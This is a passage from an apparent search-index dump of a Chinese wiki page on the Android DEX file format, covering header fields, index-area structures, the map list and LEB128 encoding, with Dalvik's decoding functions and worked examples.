\u8be5\u504f\u79fb\u91cf\u5fc5\u987b\u975e\u96f6\uff0c\u6807\u8bc6\u4ece\u6587\u4ef6\u5f00\u5934\u5230 data \u533a\u6bb5\u7684\u504f\u79fb\u91cf\u3002 string_ids_size uint \u5b57\u7b26\u4e32\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5b57\u7b26\u4e32\u6570\u91cf string_ids_off uint \u5982\u679c string_ids_size == 0 \uff08\u4e0d\u53ef\u5426\u8ba4\u662f\u4e00\u79cd\u5947\u602a\u7684\u6781\u7aef\u60c5\u51b5\uff09\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\u8868\u793a\u4ece\u6587\u4ef6\u5f00\u5934\u5230 string_ids \u7684\u504f\u79fb\u91cf\u3002 type_ids_size uint \u7c7b\u578b\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf\uff0c\u6700\u5927\u4e3a 65535 type_ids_off uint \u5982\u679c type_ids_size == 0 \uff08\u4e0d\u53ef\u5426\u8ba4\u662f\u4e00\u79cd\u5947\u602a\u7684\u6781\u7aef\u60c5\u51b5\uff09\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\u8868\u793a\u4ece\u6587\u4ef6\u5f00\u5934\u5230 type_ids \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 proto_ids_size uint \u539f\u578b\uff08\u65b9\u6cd5\uff09\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf\uff0c\u6700\u591a\u4e3a 65535 proto_ids_off uint \u5982\u679c proto_ids_size == 0 \uff08\u4e0d\u53ef\u5426\u8ba4\u662f\u4e00\u79cd\u5947\u602a\u7684\u6781\u7aef\u60c5\u51b5\uff09\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\u8be5\u504f\u79fb\u91cf\u8868\u793a\u6587\u4ef6\u5f00\u5934\u5230 proto_ids \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 field_ids_size uint \u5b57\u6bb5\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf field_ids_off uint \u5982\u679c field_ids_size == 0 \uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\u8be5\u504f\u79fb\u91cf\u8868\u793a\u6587\u4ef6\u5f00\u5934\u5230 field_ids \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 method_ids_size uint \u65b9\u6cd5\u6807\u8bc6\u7b26\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf method_ids_off uint \u5982\u679c method_ids_size == 0 \uff0c\u5219\u8be5\u503c\u4e3a 0 \u3002\u53cd\u4e4b\u8be5\u504f\u79fb\u91cf\u8868\u793a\u4ece\u6587\u4ef6\u5f00\u5934\u5230 method_ids \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 class_defs_size uint \u7c7b\u5b9a\u4e49\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6570\u91cf class_defs_off uint \u5982\u679c class_defs_size == 0 \uff08\u4e0d\u53ef\u5426\u8ba4\u662f\u4e00\u79cd\u5947\u602a\u7684\u6781\u7aef\u60c5\u51b5\uff09\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b\u53cd\u4e4b\u8be5\u504f\u79fb\u91cf\u8868\u793a\u6587\u4ef6\u5f00\u5934\u5230 class_defs \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 data_size uint data \u533a\u6bb5\u7684\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u7684\u5927\u5c0f\uff0c\u5fc5\u987b\u662f sizeof(uint) \u7684\u5076\u6570\u500d\uff0c\u8bf4\u660e8\u5b57\u8282\u5bf9\u9f50\u3002 data_off uint \u4ece\u6587\u4ef6\u5f00\u5934\u5230 data \u533a\u6bb5\u5f00\u5934\u7684\u504f\u79fb\u91cf\u3002 DEX \u7d22\u5f15\u533a \u00b6 string id \u00b6 StringIds \u533a\u6bb5\u5305\u542b stringIdsSize \u4e2a DexStringId \u7ed3\u6784\uff0c\u5176\u7ed3\u6784\u5982\u4e0b\uff1a struct DexStringId { u4 stringDataOff ; /* \u5b57\u7b26\u4e32\u6570\u636e\u504f\u79fb\uff0c\u4e5f\u5c31\u662f\u6570\u636e\u533a\u4e2d\u5404\u4e2a StringData \u7684\u6587\u4ef6\u504f\u79fb*/ }; \u53ef\u4ee5\u770b\u51faDexStringId\u4e2d\u5b58\u50a8\u7684\u53ea\u662f\u6bcf\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u76f8\u5bf9\u504f\u79fb\u3002\u6b64\u5916\uff0c\u6bcf\u4e00\u4e2a\u504f\u79fb\u5360\u636e4\u4e2a\u5b57\u8282\uff0c\u5b57\u7b26\u4e32\u90e8\u5206\u4e00\u5171\u4f1a\u5360\u636e4*stringIdsSize\u4e2a\u5b57\u8282\u3002 \u5728\u5bf9\u5e94\u7684\u504f\u79fb\u5904\uff0c\u5b57\u7b26\u4e32\u662f\u4f7f\u7528MUTF-8\u683c\u5f0f\u5b58\u50a8\u7684\uff0c\u5176\u5f00\u5934\u5b58\u50a8\u4e86\u4e4b\u524d\u6211\u4eec\u6240\u8bf4\u7684LEB128\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u8868\u793a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u4e4b\u540e\u7d27\u8ddf\u7740\u7684\u5c31\u662f\u5b57\u7b26\u4e32\uff0c\u4e4b\u540e\u4ee5\\x00\u7ed3\u5c3e\uff0c\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u4e0d\u5305\u542b\\x00\u3002 type id \u00b6 type_ids \u533a\u7d22\u5f15\u4e86java\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u7c7b\u578b\uff08\u7c7b\u3001\u6570\u7ec4\u6216\u57fa\u672c\u7c7b\u578b\uff09\uff0c\u6b64\u5217\u8868\u5fc5\u987b\u6309 string_id \u7d22\u5f15\u8fdb\u884c\u6392\u5e8f\uff0c\u5e76\u4e14\u4e0d\u80fd\u91cd\u590d\u3002 struct DexTypeId { u4 descriptorIdx ; /* \u6307\u5411 DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ }; proto Id \u00b6 Proto id\u5b57\u6bb5\u4e3b\u8981\u662f\u9488\u5bf9\u4e8e java \u4e2d\u7684\u65b9\u6cd5\u539f\u578b\u800c\u8bbe\u8ba1\u7684\uff0c\u8fd9\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86\u4e00\u4e2a\u65b9\u6cd5\u58f0\u660e\u7684\u8fd4\u56de\u7c7b\u578b\u4e0e\u53c2\u6570\u5217\u8868\uff0c\u5bf9\u4e8e\u65b9\u6cd5\u540d\u5c1a\u672a\u6d89\u53ca\u3002\u5176\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u4e09\u4e2a\u6570\u636e\u7ed3\u6784 struct DexProtoId { u4 shortyIdx ; /* \u8fd4\u56de\u7c7b\u578b+\u53c2\u6570\u7c7b\u578b\uff0c\u7b80\u5199\uff0c\u6307\u5411DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ u4 returnTypeIdx ; /* \u8fd4\u56de\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u4 parametersOff ; /* \u53c2\u6570\u7c7b\u578b\uff0c\u6307\u5411DexTypeList\u7684\u504f\u79fb */ } struct DexTypeList { u4 size ; /* DexTypeItem\u7684\u4e2a\u6570\uff0c\u5373\u53c2\u6570\u4e2a\u6570 */ DexTypeItem list [ 1 ]; /* \u6307\u5411DexTypeItem\u5f00\u59cb\u5904 */ }; struct DexTypeItem { u2 typeIdx ; /* \u53c2\u6570\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15\uff0c\u6700\u7ec8\u6307\u5411\u5b57\u7b26\u4e32\u7d22\u5f15 */ }; field id \u00b6 field id\u533a\u4e3b\u8981\u662f\u9488\u5bf9\u4e8ejava\u4e2d\u6bcf\u4e2a\u7c7b\u7684\u5b57\u6bb5\u800c\u8bbe\u8ba1\u7684\uff0c\u4e3b\u8981\u6d89\u53ca\u5230\u4ee5\u4e0b\u6570\u636e\u7ed3\u6784 struct DexFieldId { u2 classIdx ; /* \u7c7b\u7684\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u2 typeIdx ; /* \u5b57\u6bb5\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u4 nameIdx ; /* \u5b57\u6bb5\u540d\uff0c\u6307\u5411DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ }; method id \u00b6 method id\u533a\u662f\u76f4\u63a5\u4e3a java \u4e2d\u7684\u65b9\u6cd5\u800c\u8bbe\u8ba1\u7684\uff0c\u5176\u5305\u542b\u4e86\u65b9\u6cd5\u6240\u5728\u7684\u7c7b\uff0c\u65b9\u6cd5\u7684\u539f\u578b\uff0c\u65b9\u6cd5\u7684\u540d\u5b57\u3002 struct DexMethodId { u2 classIdx ; /* \u7c7b\u7684\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u2 protoIdx ; /* \u58f0\u660e\u7c7b\u578b\uff0c\u6307\u5411DexProtoId\u5217\u8868\u7684\u7d22\u5f15 */ u4 nameIdx ; /* \u65b9\u6cd5\u540d\uff0c \u6307\u5411DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ }; class def \u00b6 classDefsSize\u8868\u660e class def \u533a\u57df\u7684\u5927\u5c0f\uff0cclassDefsOff\u8868\u660eclass def \u533a\u7684\u504f\u79fb\u3002 \u8be5\u533a\u662f\u4e3a java \u4e2d\u7684\u7c7b\u800c\u8bbe\u8ba1\u7684\uff0c\u5305\u542b\u4ee5\u4e0b\u7684\u6570\u636e\u7ed3\u6784\uff0c\u76f8\u5173\u4fe1\u606f\u5982\u4e0b // \u7c7b\u7684\u57fa\u672c\u4fe1\u606f struct DexClassDef { u4 classIdx ; /* \u7c7b\u7684\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u4 accessFlags ; /* \u8bbf\u95ee\u6807\u5fd7 */ u4 superclassIdx ; /* \u7236\u7c7b\u7c7b\u578b\uff0c\u6307\u5411DexTypeId\u5217\u8868\u7684\u7d22\u5f15 */ u4 interfacesOff ; /* \u63a5\u53e3\uff0c\u6307\u5411DexTypeList\u7684\u504f\u79fb */ u4 sourceFileIdx ; /* \u6e90\u6587\u4ef6\u540d\uff0c\u6307\u5411DexStringId\u5217\u8868\u7684\u7d22\u5f15 */ u4 annotationsOff ; /* \u6ce8\u89e3\uff0c\u6307\u5411DexAnnotationsDirectoryItem\u7ed3\u6784 */ u4 classDataOff ; /* \u6307\u5411DexClassData\u7ed3\u6784\u7684\u504f\u79fb */ u4 staticValuesOff ; /* \u6307\u5411DexEncodedArray\u7ed3\u6784\u7684\u504f\u79fb */ }; // \u7c7b\u7684\u5b57\u6bb5\u4e0e\u65b9\u6cd5\u6982\u51b5 struct DexClassData { DexClassDataHeader header ; /* \u6307\u5b9a\u5b57\u6bb5\u4e0e\u65b9\u6cd5\u7684\u4e2a\u6570 */ DexField * staticFields ; /* \u9759\u6001\u5b57\u6bb5\uff0cDexField\u7ed3\u6784 */ DexField * instanceFields ; /* \u5b9e\u4f8b\u5b57\u6bb5\uff0cDexField\u7ed3\u6784 */ DexMethod * directMethods ; /* \u76f4\u63a5\u65b9\u6cd5\uff0cDexMethod\u7ed3\u6784 */ DexMethod * virtualMethods ; /* \u865a\u65b9\u6cd5\uff0cDexMethod\u7ed3\u6784 */ // \u8be6\u7ec6\u63cf\u8ff0\u7c7b\u7684\u5b57\u6bb5\u4e2a\u6570\u4e0e\u65b9\u6cd5\u4e2a\u6570 struct DexClassDataHeader { u4 staticFieldsSize ; /* \u9759\u6001\u5b57\u6bb5\u4e2a\u6570 */ u4 instanceFieldsSize ; /* \u5b9e\u4f8b\u5b57\u6bb5\u4e2a\u6570 */ u4 directMethodsSize ; /* \u76f4\u63a5\u65b9\u6cd5\u4e2a\u6570 */ u4 virtualMethodsSize ; /* \u865a\u65b9\u6cd5\u4e2a\u6570 */ }; // \u5b57\u6bb5\u5b9a\u4e49 struct DexField { u4 fieldIdx ; /* \u6307\u5411DexFieldId\u7684\u7d22\u5f15 */ u4 accessFlags ; /* \u8bbf\u95ee\u6807\u5fd7 */ }; // \u65b9\u6cd5\u5b9a\u4e49 struct DexMethod { u4 methodIdx ; /* \u6307\u5411DexMethodId\u7684\u7d22\u5f15 */ u4 accessFlags ; /* \u8bbf\u95ee\u6807\u5fd7 */ u4 codeOff ; /* \u6307\u5411DexCode\u7ed3\u6784\u7684\u504f\u79fb */ }; // \u4ee3\u7801\u6982\u51b5 struct DexCode { u2 registersSize ; /* \u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u4e2a\u6570 */ u2 insSize ; /* \u53c2\u6570\u4e2a\u6570 */ u2 outsSize ; /* \u8c03\u7528\u5176\u4ed6\u65b9\u6cd5\u65f6\u5176\u5b83\u65b9\u6cd5\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u4e2a\u6570\uff0c\u4f1a\u5728\u81ea\u5df1\u7684\u8c03\u7528\u6808\u7533\u8bf7\uff0c\u5e76\u538b\u6808\uff08\u731c\u6d4b\uff09 */ u2 triesSize ; /* Try/Catch\u4e2a\u6570 */ u4 debugInfoOff ; /* \u6307\u5411\u8c03\u8bd5\u4fe1\u606f\u7684\u504f\u79fb */ u4 insnsSize ; /* \u6307\u4ee4\u96c6\u4e2a\u6570\uff0c\u4ee52\u5b57\u8282\u4e3a\u5355\u4f4d */ u2 insns [ 1 ]; /* \u6307\u4ee4\u96c6 */ }; \u5c0f\u7ed3 \u00b6 \u53ef\u4ee5\u770b\u51fa\u5728\u7d22\u5f15\u533a\u6307\u5411\u662f\u6bd4\u8f83\u590d\u6742\u7684\uff0c\u4f46\u540c\u65f6\u4e5f\u6bd4\u8f83\u5de7\u5999\uff0c\u8fd9\u91cc\u7ed9\u51faDalvik\u8bbe\u8ba1\u8005\u5728 Google Developer Day 2008 China \u6f14\u8bb2\u4e2d\u7ed9\u51fa\u7684\u4f8b\u5b50\u3002 DEX \u6570\u636e\u533a \u00b6 \u8fd9\u91cc\u5b58\u7684\u5c31\u662f\u4e4b\u524d\u6240\u8bf4\u7684\u5404\u79cd\u6570\u636e\u4e86\u3002 DEX map section \u00b6 DexHeader\u4e2d\u7684mapOff\u5b57\u6bb5\u7ed9\u51fa\u4e86DexMapList\u7ed3\u6784\u5728DEX\u6587\u4ef6\u4e2d\u7684\u504f\u79fb\u3002\u5f53Dalvik\u865a\u62df\u673a\u89e3\u6790DEX\u6587\u4ef6\u540e\u7684\u5185\u5bb9\u540e\uff0c\u4f1a\u5c06\u5185\u5bb9\u6620\u5c04\u5230DexMapList\u6570\u636e\u7ed3\u6784\uff0c\u53ef\u4ee5\u8bf4\u8be5\u7ed3\u6784\u63cf\u8ff0\u4e86\u5bf9\u5e94\u7684DEX\u6587\u4ef6\u7684\u6574\u4f53\u6982\u51b5\u3002\u5176\u5177\u4f53\u4ee3\u7801\u5982\u4e0b struct DexMapList { u4 size ; /* DexMapItem\u7684\u4e2a\u6570\uff0c\u65b9\u4fbf\u89e3\u6790 */ DexMapItem list [ 1 ]; /* \u6307\u5411DexMapItem */ }; struct DexMapItem { u2 type ; /* kDexType\u5f00\u5934\u7684\u7c7b\u578b */ u2 unused ; /* \u672a\u4f7f\u7528\uff0c\u7528\u4e8e\u5b57\u8282\u5bf9\u9f50 */ u4 size ; /* \u6307\u5b9a\u76f8\u5e94\u7c7b\u578b\u7684\u4e2a\u6570 */ u4 offset ; /* \u6307\u5b9a\u76f8\u5e94\u7c7b\u578b\u7684\u6570\u636e\u7684\u6587\u4ef6\u504f\u79fb */ }; /* type\u5b57\u6bb5\u4e3a\u4e00\u4e2a\u679a\u4e3e\u5e38\u91cf\uff0c\u901a\u8fc7\u7c7b\u578b\u540d\u79f0\u5f88\u5bb9\u6613\u5224\u65ad\u5b83\u7684\u5177\u4f53\u7c7b\u578b\u3002 */ /* map item type codes */ enum { kDexTypeHeaderItem = 0x0000 , kDexTypeStringIdItem = 0x0001 , kDexTypeTypeIdItem = 0x0002 , kDexTypeProtoIdItem = 0x0003 , kDexTypeFieldIdItem = 0x0004 , kDexTypeMethodIdItem = 0x0005 , kDexTypeClassDefItem = 0x0006 , kDexTypeMapList = 0x1000 , kDexTypeTypeList = 0x1001 , kDexTypeAnnotationSetRefList = 0x1002 , kDexTypeAnnotationSetItem = 0x1003 , kDexTypeClassDataItem = 0x2000 , kDexTypeCodeItem = 0x2001 , kDexTypeStringDataItem = 0x2002 , kDexTypeDebugInfoItem = 0x2003 , kDexTypeAnnotationItem = 0x2004 , kDexTypeEncodedArrayItem = 0x2005 , kDexTypeAnnotationsDirectoryItem = 0x2006 , }; DEX\u5b9e\u4f8b \u00b6 \u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u5df1\u627e\u4e00\u4e2a apk\uff0c\u7136\u540e\u62ff 010editor \u7684\u6a21\u677f\u89e3\u6790\u4e00\u4e0b\u5c31\u53ef\u4ee5\u770b\u5230\u76f8\u5e94\u7684\u7ed3\u679c\u4e86\u3002 \u53c2\u8003\u9605\u8bfb \u00b6 Android \u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790","title":"DEX"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex","text":"","title":"DEX\u6587\u4ef6"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#_1","text":"Google \u4e3a Android \u4e2d\u7684 Java \u4ee3\u7801\u4e13\u95e8\u8bbe\u8ba1\u4e86\u5bf9\u5e94\u7684\u53ef\u6267\u884c\u6587\u4ef6 DEX\uff08Dalvik eXecutable File\uff09\uff0c\u9002\u7528\u4e8e\u624b\u673a\u8fd9\u6837\u7684\u5185\u5b58\u4f4e\u548c\u5904\u7406\u5668\u6027\u80fd\u8f83\u5dee\u7684\u79fb\u52a8\u5e73\u53f0\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u5c31\u6765\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e0bDEX\u6587\u4ef6\u7684\u683c\u5f0f\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex_1","text":"","title":"DEX \u6587\u4ef6\u683c\u5f0f"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#_2","text":"\u5728\u4ecb\u7ecd DEX \u6587\u4ef6\u7684\u5177\u4f53\u7ed3\u6784\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u6765\u5173\u6ce8\u4e00\u4e0b DEX \u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u4e00\u4e9b\u57fa\u7840\u7684\u6570\u636e\u7c7b\u578b\u3002 \u540d\u79f0 \u8bf4\u660e byte 8 \u4f4d\u6709\u7b26\u53f7\u6574\u6570 ubyte 8 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570 short 16 \u4f4d\u6709\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f ushort 16 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f int 32 \u4f4d\u6709\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f uint 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f long 64 \u4f4d\u6709\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f ulong 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f sleb128 \u6709\u7b26\u53f7 LEB128\uff0c\u53ef\u53d8\u957f\u5ea6\uff08\u89c1\u4e0b\u6587\uff09 uleb128 \u65e0\u7b26\u53f7 LEB128\uff0c\u53ef\u53d8\u957f\u5ea6\uff08\u89c1\u4e0b\u6587\uff09 uleb128p1 \u65e0\u7b26\u53f7 LEB128 \u52a0 1 \uff0c\u53ef\u53d8\u957f\u5ea6\uff08\u89c1\u4e0b\u6587\uff09 \u5176\u4e2d\u4e4b\u6240\u4ee5\u4f1a\u91c7\u7528\u53d8\u957f\u7684\u6570\u636e\u7c7b\u578b\u662f\u56e0\u4e3a\u5e0c\u671b\u53ef\u4ee5\u5c3d\u53ef\u80fd\u51cf\u5c11\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5360\u7528\u7a7a\u95f4\uff0c\u6bd4\u5982\u8bf4\u5982\u679c\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u4e3a5\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ea\u9700\u8981\u4e00\u4e2a\u5b57\u8282\u5373\u53ef\uff0c\u4f46\u662f\u6211\u4eec\u53c8\u4e0d\u5e0c\u671b\u76f4\u63a5\u4f7f\u7528 u1 \u6765\u8fdb\u884c\u5b9a\u4e49\u76f8\u5e94\u7c7b\u578b\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u628a\u6240\u6709\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u90fd\u9650\u5236\u5728\u76f8\u5e94\u7684\u8303\u56f4\u5185\u3002 \u53ef\u53d8\u957f\u5ea6\u7684\u7c7b\u578b\u5176\u5b9e\u90fd\u662f\u57fa\u4e8e LEB128(Little-Endian Base) \u7c7b\u578b\u7684\uff0c\u53ef\u4ee5\u7528\u4e8e\u8868\u793a 32 \u4f4d\u5927\u5c0f\u7684 int \u6570\u5b57\uff0c\u5176\u6839\u636e\u6240\u8981\u8868\u793a\u7684\u6570\u5b57\u7684\u5927\u5c0f\u6765\u9009\u62e9\u5408\u9002\u7684\u957f\u5ea6\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5176\u4e2d\u6bcf\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u4f4d\u8868\u793a\u662f\u5426\u4f7f\u7528\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c1 \u8868\u793a\u4f7f\u7528\uff0c0 \u8868\u793a\u4e0d\u4f7f\u7528\u3002\u6545\u800c\u6bcf\u4e2a\u5b57\u8282\u5176\u5b9e\u53ea\u6709 7 \u4e2a\u6709\u6548\u7684 bit \u4f4d\u7528\u6765\u8868\u793a\u76f8\u5e94\u7684\u6570\u5b57\u3002\u5982\u679c\u6709\u4e00\u4e2a LEB128 \u7c7b\u578b\u7684\u53d8\u91cf\u4f7f\u7528\u4e86 5 \u4e2a\u5b57\u8282\uff0c\u5e76\u4e14\u7b2c\u4e94\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u4f4d\u4e3a 1 \uff0c\u90a3\u8bf4\u660e\u51fa\u73b0\u4e86\u95ee\u9898\u3002 dalvik\u4e2d\u8bfb\u53d6\u65e0\u7b26\u53f7leb128\u7c7b\u578b\u7684\u51fd\u6570\u5982\u4e0b DEX_INLINE int readUnsignedLeb128 ( const u1 ** pStream ) { const u1 * ptr = * pStream ; int result = * ( ptr ++ ); //\u53d6\u7b2c\u4e00\u4e2a\u5b57\u8282 if ( result > 0x7f ) { //\u5982\u679c\u7b2c1\u4e2a\u5b57\u8282\u5927\u4e8e0x7f,\u8868\u793a\u7b2c\u4e00\u4e2a\u5b57\u8282\u6700\u9ad8\u4f4d\u4e3a1 int cur = * ( ptr ++ ); //\u7b2c2\u4e2a\u5b57\u8282 result = ( result & 0x7f ) | (( cur & 0x7f ) << 7 ); //\u524d\u4e24\u4e2a\u5b57\u8282 if ( cur > 0x7f ) { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 14 ; if ( cur > 0x7f ) { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 21 ; if ( cur > 0x7f ) { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = * ( ptr ++ ); result |= cur << 28 ; } } } } * pStream = ptr ; return result ; } \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u6211\u4eec\u8981\u8ba1\u7b97c0 83 92 25\u7684uleb128\u503c\uff0c\u5982\u4e0b \u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u4f4d\u4e3a1\uff0c\u6240\u4ee5\u6709\u7b2c\u4e8c\u4e2a\u5b57\u8282\u3002result1 = 0xc0 & 0x7f=0x40 \u7c7b\u4f3c\u7684\uff0c\u7b2c\u4e8c\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684result2 = (0x83 & 0x7f)<<7 = 0x180 \u7b2c\u4e09\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684result3 = (0x92 & 0x7f) <<14 = 0x48000 \u7b2c\u56db\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684result4 = (0x25)<<21 = 0x4a00000 \u8be5\u5b57\u8282\u6d41\u5bf9\u5e94\u7684\u503c\u4e3aresult1+result2+result3+result4 = 0x4a481c0 dalvik\u4e2d\u8bfb\u53d6\u6709\u7b26\u53f7\u7684LEB128\u7c7b\u578b\u7684\u6570\u5b57\u5982\u4e0b DEX_INLINE int readSignedLeb128 ( const u1 ** pStream ) { const u1 * ptr = * pStream ; int result = * ( ptr ++ ); if ( result <= 0x7f ) { result = ( result << 25 ) >> 25 ; //\u7b26\u53f7\u6269\u5c55 } else { int cur = * ( ptr ++ ); result = ( result & 0x7f ) | (( cur & 0x7f ) << 7 ); if ( cur <= 0x7f ) { result = ( result << 18 ) >> 18 ; //\u7b26\u53f7\u6269\u5c55 } else { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 14 ; //\u7b26\u53f7\u6269\u5c55 if ( cur <= 0x7f ) { result = ( result << 11 ) >> 11 ; //\u7b26\u53f7\u6269\u5c55 } else { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 21 ; if ( cur <= 0x7f ) { result = ( result << 4 ) >> 4 ; //\u7b26\u53f7\u6269\u5c55 } else { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = * ( ptr ++ ); result |= cur << 28 ; } } } } * pStream = ptr ; return result ; } \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u6211\u4eec\u8981\u8ba1\u7b97d1 c2 b3 40\u7684sleb128\u503c\uff0c\u8ba1\u7b97\u8fc7\u7a0b\u5982\u4e0b result1 = 0xd1 & 0x7f = 0x51 result2 = (0xc2 & 0x7f) <<7 = 0x21000 result3 = (0xb3 & 0x7f) <<14 =0xcc000 result4 = (0x40)<< 21 = 0x8000000 \u6700\u540e\u7ed3\u679c(r1+r2+r3+r4)<< 4 >>4 = 0xf80ce151 uleb128p1\u7c7b\u578b\u4e3b\u8981\u662f\u7528\u8868\u793a\u65e0\u7b26\u53f7\u6570\uff0c\u5176\u9002\u7528\u4e8e\u4ee5\u4e0b\u573a\u666f \u8981\u6c42\u6570\u5b57\u7684\u8868\u793a\u5fc5\u987b\u975e\u8d1f \u5f53\u6570\u5b57\u4e3a0xffffffff\u65f6\uff0c\u5176\u52a0\u4e0a1\u5c31\u4e3a0\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53ea\u9700\u89811\u4e2a\u5b57\u8282\u5373\u53ef\u3002 \u6709\u5f85\u8fdb\u4e00\u6b65\u601d\u8003\u3002","title":"\u6570\u636e\u7c7b\u578b\u5b9a\u4e49"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex_2","text":"DEX\u6587\u4ef6\u7684\u6574\u4f53\u7ed3\u6784\u5982\u4e0b \u4e3b\u8981\u5305\u62ec\u4e09\u4e2a\u90e8\u5206 \u6587\u4ef6\u5934\uff0c\u7ed9\u51fadex\u6587\u4ef6\u7684\u57fa\u672c\u5c5e\u6027\u3002 \u7d22\u5f15\u533a\uff0c\u7ed9\u51fa\u76f8\u5173\u6570\u636e\u7684\u7d22\u5f15\uff0c\u5176\u6570\u636e\u5176\u5b9e\u653e\u5728\u6570\u636e\u533a\u3002 \u6570\u636e\u533a\uff0c\u5b58\u653e\u771f\u5b9e\u7684\u5b57\u7b26\u4e32\uff0c\u4ee3\u7801\u3002","title":"DEX \u6587\u4ef6\u6982\u89c8"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex_3","text":"DEX\u7684\u6587\u4ef6\u5934\u4e3b\u8981\u5305\u542bmagic\u5b57\u6bb5\u3001alder32\u6821\u9a8c\u503c\u3001SHA-1\u54c8\u5e0c\u503c\u3001string_ids\u7684\u4e2a\u6570\u4ee5\u53ca\u504f\u79fb\u5730\u5740\u7b49\uff0c\u56fa\u5b9a\u5360\u75280x70\u4e2a\u5b57\u8282\uff0c\u6570\u636e\u7ed3\u6784\u5982\u4e0b struct DexHeader { u1 magic [ 8 ]; /* includes version number */ u4 checksum ; /* adler32 checksum */ u1 signature [ kSHA1DigestLen ]; /* SHA-1 hash */ u4 fileSize ; /* length of entire file */ u4 headerSize ; /* offset to start of next section */ u4 endianTag ; u4 linkSize ; u4 linkOff ; u4 mapOff ; u4 stringIdsSize 